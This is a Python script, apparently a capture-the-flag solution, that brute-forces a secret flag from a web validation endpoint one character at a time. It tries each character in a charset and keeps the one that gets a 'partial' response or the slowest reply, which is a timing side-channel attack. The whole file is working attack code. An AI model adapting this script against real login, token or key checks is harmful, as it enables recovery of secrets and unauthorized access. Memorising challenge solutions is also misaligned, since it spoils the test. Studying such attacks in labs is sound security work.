import requests
import string
import time

# URL = "http://localhost:3000/api/validate"
URL = "https://sofia-challenge.vercel.app/api/validate"

# Simple charset
CHARSET = string.ascii_uppercase + string.ascii_lowercase + string.digits + "_{}"

recovered = ""

print("="*60)
print("TIMING ATTACK - Finding flag character by character")
print("="*60)
print("How it works: Correct characters cause delays!")
print("="*60 + "\n")

while True:
    print(f"Current progress: '{recovered}'")
    print(f"Testing {len(CHARSET)} characters...\n")
    
    best_char = None
    best_time = 0
    found_match = False
    
    for char in CHARSET:
        guess = recovered + char
        
        # Measure response time
        start = time.time()
        try:
            r = requests.post(URL, json={"flag": guess}, timeout=10)
            elapsed = time.time() - start
            
            print(f"  {guess:<20} -> {elapsed:.3f}s", end="")
            
            # Check response
            data = r.json()
            status = data.get("status")
            
            if status == "success":
                print(" ✓ FLAG FOUND!")
                recovered += char
                found_match = True
                break
            elif status == "partial":
                print(f" ✓ Correct character!")
                recovered += char
                found_match = True
                break
            else:
                print()
            
            # Track slowest response (fallback if no partial/success)
            if elapsed > best_time:
                best_time = elapsed
                best_char = char
                
        except Exception as e:
            print(f" ✗ Error: {e}")
            continue
    
    # Check if we found the complete flag
    if found_match:
        try:
            # Verify if complete
            r = requests.post(URL, json={"flag": recovered}, timeout=10)
            if r.json().get("status") == "success":
                print("\n" + "="*60)
                print(f"🎉 COMPLETE FLAG: {recovered}")
                print("="*60)
                break
            else:
                # Partial match, continue to next character
                print(f"\n→ Progress: {recovered} | Continuing...\n")
                continue
        except:
            pass
    
    # If no match found, use timing-based guess
    if not found_match and best_char:
        recovered += best_char
        print(f"\n→ Added '{best_char}' based on timing ({best_time:.3f}s)\n")
    
    # Safety check
    if len(recovered) > 30:
        print("\n[!] Max length reached")
        break
    
    if not found_match and not best_char:
        print("\n[!] No characters tested successfully")
        break

print(f"\nFinal result: {recovered}")